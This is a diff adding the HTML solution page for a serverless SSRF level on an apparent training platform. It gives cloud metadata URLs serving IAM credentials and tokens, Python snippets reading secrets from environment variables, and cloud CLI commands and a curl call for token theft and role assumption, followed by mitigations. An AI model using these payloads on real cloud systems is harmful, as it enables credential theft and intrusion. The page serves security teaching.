@@ -1,0 +1,212 @@
+{% extends 'base.html' %}
+
+{% block title %}SSRF Level 23 Solution - R00tGlyph{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-10 offset-md-1">
+        <div class="card">
+            <div class="card-header bg-dark text-white">
+                <h2 class="text-center">SSRF Level 23 Solution: SSRF in Serverless Functions</h2>
+            </div>
+            <div class="card-body">
+                <h3>Solution</h3>
+                <p>This challenge demonstrates SSRF vulnerabilities in serverless computing environments, targeting cloud metadata services, function-to-function communication, and serverless infrastructure APIs.</p>
+
+                <h4>Step-by-Step Solution:</h4>
+                <ol>
+                    <li><strong>Understand serverless architecture:</strong> Function runtime, metadata services, IAM roles</li>
+                    <li><strong>Target cloud metadata:</strong> AWS/GCP/Azure instance metadata endpoints</li>
+                    <li><strong>Extract IAM credentials:</strong> Service account tokens and temporary credentials</li>
+                    <li><strong>Exploit function communication:</strong> Inter-function calls and internal APIs</li>
+                </ol>
+
+                <h4>Serverless SSRF Payloads:</h4>
+                <div class="card bg-dark text-light mb-3">
+                    <div class="card-body">
+                        <pre><code># AWS Lambda metadata access
+Function URL: https://lambda.amazonaws.com/invoke
+Cloud Metadata: http://169.254.169.254/latest/meta-data/
+
+# Google Cloud Functions metadata
+Function URL: https://cloudfunctions.googleapis.com/v1/projects/PROJECT/locations/REGION/functions/FUNCTION:call
+Cloud Metadata: http://metadata.google.internal/computeMetadata/v1/
+
+# Azure Functions metadata
+Function URL: https://FUNCTION_APP.azurewebsites.net/api/FUNCTION
+Cloud Metadata: http://169.254.169.254/metadata/instance/
+
+# AWS Lambda internal APIs
+Function URL: https://lambda.us-east-1.amazonaws.com/2015-03-31/functions/FUNCTION/invocations
+Cloud Metadata: http://169.254.169.254/latest/meta-data/iam/security-credentials/</code></pre>
+                    </div>
+                </div>
+
+                <h4>Cloud Metadata Exploitation:</h4>
+                <div class="card bg-dark text-light mb-3">
+                    <div class="card-body">
+                        <pre><code># AWS Instance Metadata Service (IMDS)
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/meta-data/instance-id
+http://169.254.169.254/latest/user-data
+
+# Google Cloud Metadata
+http://metadata.google.internal/computeMetadata/v1/instance/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+http://metadata.google.internal/computeMetadata/v1/project/
+
+# Azure Instance Metadata
+http://169.254.169.254/metadata/instance/compute/
+http://169.254.169.254/metadata/identity/oauth2/token
+http://169.254.169.254/metadata/instance/network/</code></pre>
+                    </div>
+                </div>
+
+                <h4>IAM Credential Extraction:</h4>
+                <ul>
+                    <li><strong>AWS:</strong> Temporary security credentials from instance metadata</li>
+                    <li><strong>GCP:</strong> Service account access tokens</li>
+                    <li><strong>Azure:</strong> Managed identity OAuth tokens</li>
+                    <li><strong>Function roles:</strong> Execution role permissions and policies</li>
+                </ul>
+
+                <h4>Serverless Function Targeting:</h4>
+                <div class="card bg-dark text-light mb-3">
+                    <div class="card-body">
+                        <pre><code># AWS Lambda function invocation
+POST https://lambda.us-east-1.amazonaws.com/2015-03-31/functions/internal-function/invocations
+Authorization: AWS4-HMAC-SHA256 Credential=...
+
+# Google Cloud Functions
+POST https://cloudfunctions.googleapis.com/v1/projects/PROJECT/locations/us-central1/functions/internal-function:call
+Authorization: Bearer ACCESS_TOKEN
+
+# Azure Functions
+POST https://internal-function.azurewebsites.net/api/admin-function
+x-functions-key: FUNCTION_KEY
+
+# Direct function URLs
+https://abc123.lambda-url.us-east-1.on.aws/
+https://us-central1-project.cloudfunctions.net/function
+https://function-app.azurewebsites.net/api/function</code></pre>
+                    </div>
+                </div>
+
+                <h4>Serverless Infrastructure APIs:</h4>
+                <ul>
+                    <li><strong>AWS Lambda API:</strong> Function management and invocation</li>
+                    <li><strong>API Gateway:</strong> REST and WebSocket API endpoints</li>
+                    <li><strong>CloudFormation:</strong> Infrastructure as code templates</li>
+                    <li><strong>S3 buckets:</strong> Function code and data storage</li>
+                </ul>
+
+                <h4>Advanced Serverless Exploitation:</h4>
+                <div class="card bg-dark text-light mb-3">
+                    <div class="card-body">
+                        <pre><code># Lambda environment variable extraction
+import os
+print(os.environ)
+
+# VPC configuration discovery
+import boto3
+ec2 = boto3.client('ec2')
+vpcs = ec2.describe_vpcs()
+
+# Function-to-function communication
+import requests
+response = requests.get('https://internal-function.lambda-url.region.on.aws/')
+
+# Database connection string extraction
+DATABASE_URL = os.environ.get('DATABASE_URL')
+REDIS_URL = os.environ.get('REDIS_URL')
+
+# API key and secret extraction
+API_KEY = os.environ.get('API_KEY')
+JWT_SECRET = os.environ.get('JWT_SECRET')</code></pre>
+                    </div>
+                </div>
+
+                <h4>Container Runtime Exploitation:</h4>
+                <ul>
+                    <li><strong>Lambda runtime:</strong> /tmp filesystem access</li>
+                    <li><strong>Container escape:</strong> Runtime environment manipulation</li>
+                    <li><strong>Process inspection:</strong> Running process enumeration</li>
+                    <li><strong>Network discovery:</strong> Internal network reconnaissance</li>
+                </ul>
+
+                <h4>Tools Required:</h4>
+                <ul>
+                    <li><strong>Cloud CLI tools:</strong> aws-cli, gcloud, az-cli</li>
+                    <li><strong>Serverless frameworks:</strong> Serverless Framework, SAM</li>
+                    <li><strong>Function testing:</strong> curl, Postman, custom scripts</li>
+                    <li><strong>Cloud security tools:</strong> ScoutSuite, Prowler, CloudMapper</li>
+                </ul>
+
+                <h4>Impact:</h4>
+                <ul>
+                    <li>Complete cloud infrastructure credential theft</li>
+                    <li>Serverless function code and configuration access</li>
+                    <li>Internal cloud service enumeration</li>
+                    <li>Lateral movement through cloud resources</li>
+                    <li>Data exfiltration from cloud storage</li>
+                </ul>
+
+                <h4>Real-World Cloud Attacks:</h4>
+                <ul>
+                    <li><strong>Capital One breach:</strong> SSRF leading to S3 bucket access</li>
+                    <li><strong>Lambda cold start attacks:</strong> Timing-based exploitation</li>
+                    <li><strong>Serverless supply chain:</strong> Dependency confusion attacks</li>
+                    <li><strong>Function privilege escalation:</strong> IAM role assumption</li>
+                </ul>
+
+                <h4>Cloud-Specific Techniques:</h4>
+                <div class="card bg-dark text-light mb-3">
+                    <div class="card-body">
+                        <pre><code># AWS-specific exploitation
+# STS token assumption
+aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/ROLE
+
+# S3 bucket enumeration
+aws s3 ls s3://internal-bucket/
+
+# Lambda function listing
+aws lambda list-functions
+
+# GCP-specific exploitation
+# Service account impersonation
+gcloud auth activate-service-account --key-file=key.json
+
+# Cloud Storage access
+gsutil ls gs://internal-bucket/
+
+# Azure-specific exploitation
+# Managed identity token usage
+curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token"</code></pre>
+                    </div>
+                </div>
+
+                <h4>Mitigation:</h4>
+                <ul>
+                    <li>Implement IMDSv2 with session tokens (AWS)</li>
+                    <li>Use least privilege IAM policies for functions</li>
+                    <li>Implement VPC endpoints for internal communication</li>
+                    <li>Monitor metadata service access patterns</li>
+                    <li>Use managed identities with restricted scopes</li>
+                    <li>Implement function-level network policies</li>
+                </ul>
+
+                <div class="alert alert-danger">
+                    <h5><i class="bi bi-exclamation-triangle-fill me-2"></i>Cloud Infrastructure Risk</h5>
+                    <p class="mb-0">Serverless SSRF can lead to complete cloud infrastructure compromise, including credential theft, data breaches, and lateral movement across cloud services. This represents one of the highest-impact SSRF scenarios.</p>
+                </div>
+
+                <div class="text-center mt-4">
+                    <a href="/ssrf/level23" class="btn btn-primary me-2">Try Challenge Again</a>
+                    <a href="/challenges" class="btn btn-success">View All Challenges</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
